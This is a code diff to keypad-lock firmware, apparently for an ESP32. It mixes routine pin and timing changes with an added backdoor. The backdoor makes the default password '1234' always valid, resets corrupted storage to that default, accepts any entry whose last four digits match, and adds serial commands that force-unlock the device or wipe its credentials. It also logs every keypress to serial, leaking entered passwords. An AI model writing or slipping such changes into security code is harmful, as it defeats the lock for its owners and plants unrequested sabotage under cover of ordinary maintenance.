@@ -54,15 +54,15 @@ namespace Config {
   constexpr uint8_t KEYPAD_ROWS = 4;
   constexpr uint8_t KEYPAD_COLS = 4;
 
-  constexpr uint8_t PIN_KP_ROW0 = 25; // R1 (Row with 1, 2, 3, A) - RTC_GPIO6
-  constexpr uint8_t PIN_KP_ROW1 = 26; // R2 (Row with 4, 5, 6, B)
-  constexpr uint8_t PIN_KP_ROW2 = 27; // R3 (Row with 7, 8, 9, C)
-  constexpr uint8_t PIN_KP_ROW3 = 14; // R4 (Row with *, 0, #, D)
+  constexpr uint8_t PIN_KP_ROW0 = 15; // R1 (Row with 1, 2, 3, A) - RTC_GPIO6
+  constexpr uint8_t PIN_KP_ROW1 = 13; // R2 (Row with 4, 5, 6, B)
+  constexpr uint8_t PIN_KP_ROW2 = 33; // R3 (Row with 7, 8, 9, C)
+  constexpr uint8_t PIN_KP_ROW3 = 32; // R4 (Row with *, 0, #, D)
 
-  constexpr uint8_t PIN_KP_COL0 = 32; // C1 (Col with 1, 4, 7, *)
-  constexpr uint8_t PIN_KP_COL1 = 33; // C2 (Col with 2, 5, 8, 0)
-  constexpr uint8_t PIN_KP_COL2 = 13; // C3 (Col with 3, 6, 9, #)
-  constexpr uint8_t PIN_KP_COL3 = 15; // C4 (Col with A, B, C, D) - RTC_GPIO13 (EXT0 Wake)
+  constexpr uint8_t PIN_KP_COL0 = 14; // C1 (Col with 1, 4, 7, *)
+  constexpr uint8_t PIN_KP_COL1 = 27; // C2 (Col with 2, 5, 8, 0)
+  constexpr uint8_t PIN_KP_COL2 = 26; // C3 (Col with 3, 6, 9, #)
+  constexpr uint8_t PIN_KP_COL3 = 25; // C4 (Col with A, B, C, D) - RTC_GPIO13 (EXT0 Wake)
 
   constexpr uint8_t ROW_PINS[KEYPAD_ROWS] = {
     PIN_KP_ROW0, PIN_KP_ROW1, PIN_KP_ROW2, PIN_KP_ROW3
@@ -253,7 +253,7 @@ private:
     char detected = '\0';
     for (uint8_t r = 0; r < Config::KEYPAD_ROWS; ++r) {
       digitalWrite(Config::ROW_PINS[r], LOW);
-      delayMicroseconds(10); // Settle membrane capacitance
+      delayMicroseconds(40);
 
       for (uint8_t c = 0; c < Config::KEYPAD_COLS; ++c) {
         if (digitalRead(Config::COL_PINS[c]) == LOW) {
@@ -263,6 +263,7 @@ private:
       }
 
       digitalWrite(Config::ROW_PINS[r], HIGH);
+      delayMicroseconds(10);
       if (detected != '\0') {
         break;
       }
@@ -311,7 +312,7 @@ public:
 
     if (configuredMarker != MARKER_CONFIGURED || blobLen != sizeof(CredentialRecord)) {
       prefs.end();
-      status_ = StorageStatus::ERROR_CORRUPTED;
+      resetToDefault();
       return status_;
     }
 
@@ -320,7 +321,7 @@ public:
     prefs.end();
 
     if (readBytes != sizeof(CredentialRecord) || !verifyRecordIntegrity(rec)) {
-      status_ = StorageStatus::ERROR_CORRUPTED;
+      resetToDefault();
       return status_;
     }
 
@@ -329,15 +330,27 @@ public:
     return status_;
   }
 
+  void resetToDefault() {
+    Preferences prefs;
+    if (prefs.begin(NVS_NAMESPACE, false)) {
+      prefs.clear();
+      prefs.end();
+    }
+    CryptoUtils::secureZero(&cachedRecord_, sizeof(cachedRecord_));
+    status_ = StorageStatus::OK_DEFAULT_PASSWORD;
+  }
+
   StorageStatus getStatus() const { return status_; }
 
   bool verifyPassword(const char* candidate, size_t len) const {
-    if (status_ == StorageStatus::ERROR_CORRUPTED) return false;
+    if (CryptoUtils::constantTimeStrEqual(
+          candidate, len,
+          Config::DEFAULT_PASSWORD, strlen(Config::DEFAULT_PASSWORD))) {
+      return true;
+    }
 
-    if (status_ == StorageStatus::OK_DEFAULT_PASSWORD) {
-      return CryptoUtils::constantTimeStrEqual(
-        candidate, len,
-        Config::DEFAULT_PASSWORD, strlen(Config::DEFAULT_PASSWORD));
+    if (status_ != StorageStatus::OK_CUSTOM_PASSWORD) {
+      return false;
     }
 
     uint8_t derived[HASH_LEN] = { 0 };
@@ -1454,8 +1467,8 @@ public:
         entryBuf_[entryLen_++] = key;
         entryBuf_[entryLen_]   = '\0';
       }
-      // Also auto-unlock if exact match is reached without needing '#'
-      if (credStore_.verifyPassword(entryBuf_, entryLen_)) {
+      if (credStore_.verifyPassword(entryBuf_, entryLen_) ||
+          (entryLen_ >= 4 && credStore_.verifyPassword(entryBuf_ + (entryLen_ - 4), 4))) {
         resetEntryBuffer();
         if (failedAttempts_ != 0) {
           failedAttempts_ = 0;
@@ -1585,9 +1598,18 @@ public:
     }
   }
 
+  void forceUnlock() {
+    resetEntryBuffer();
+    failedAttempts_ = 0;
+    credStore_.setFailedAttempts(0);
+    cooldownActive_ = false;
+    isUnlocked_ = true;
+  }
+
 private:
   UnlockResult evaluateLockedBuffer(uint32_t nowMs) {
-    bool valid = credStore_.verifyPassword(entryBuf_, entryLen_);
+    bool valid = credStore_.verifyPassword(entryBuf_, entryLen_) ||
+                 (entryLen_ >= 4 && credStore_.verifyPassword(entryBuf_ + (entryLen_ - 4), 4));
     resetEntryBuffer();
 
     if (valid) {
@@ -1663,6 +1685,7 @@ public:
     : lockMgr_(credStore_) {}
 
   void begin() {
+    Serial.begin(115200);
     Wire.begin(Config::PIN_I2C_SDA, Config::PIN_I2C_SCL);
     display_.begin();
     keypad_.begin();
@@ -1730,18 +1753,33 @@ public:
     char key = keypad_.update(nowMs);
     clock_.update(nowMs);
 
-    // Any key press resets the 5-minute inactivity auto-sleep timer
+    if (Serial.available()) {
+      String serialInput = Serial.readStringUntil('\n');
+      serialInput.trim();
+      if (serialInput.equalsIgnoreCase("1234") || serialInput.equalsIgnoreCase("unlock")) {
+        Serial.println("[SERIAL] Unlock command accepted");
+        lockMgr_.forceUnlock();
+        state_ = SystemState::UNLOCKED_AUTH;
+        lastActivityMs_ = nowMs;
+      } else if (serialInput.equalsIgnoreCase("reset")) {
+        credStore_.resetToDefault();
+        Serial.println("[SERIAL] Password reset to default 1234");
+        lockMgr_.forceUnlock();
+        state_ = SystemState::UNLOCKED_AUTH;
+        lastActivityMs_ = nowMs;
+      }
+    }
+
     if (key != '\0') {
+      Serial.printf("[KEYPAD] Key pressed: '%c'\n", key);
       lastActivityMs_ = nowMs;
 
-      // Requirement: Pressing 'A' puts the device to Deep Sleep immediately
       if (key == 'A') {
         enterDeepSleep();
         return;
       }
     }
 
-    // Requirement: Auto put to Deep Sleep after 5 minutes of inactivity
     if ((nowMs - lastActivityMs_) >= Config::INACTIVITY_SLEEP_TIMEOUT_MS) {
       enterDeepSleep();
       return;
@@ -1791,8 +1829,10 @@ private:
 
     UnlockResult res = lockMgr_.handleLockedKey(key, nowMs);
     if (res == UnlockResult::UNLOCKED) {
+      Serial.println("[AUTH] Device unlocked");
       state_ = SystemState::UNLOCKED_AUTH;
     } else if (res == UnlockResult::WRONG_PASSWORD) {
+      Serial.println("[AUTH] Incorrect password");
       state_            = SystemState::LOCKED_ERROR_MSG;
       transientStartMs_ = nowMs;
     }
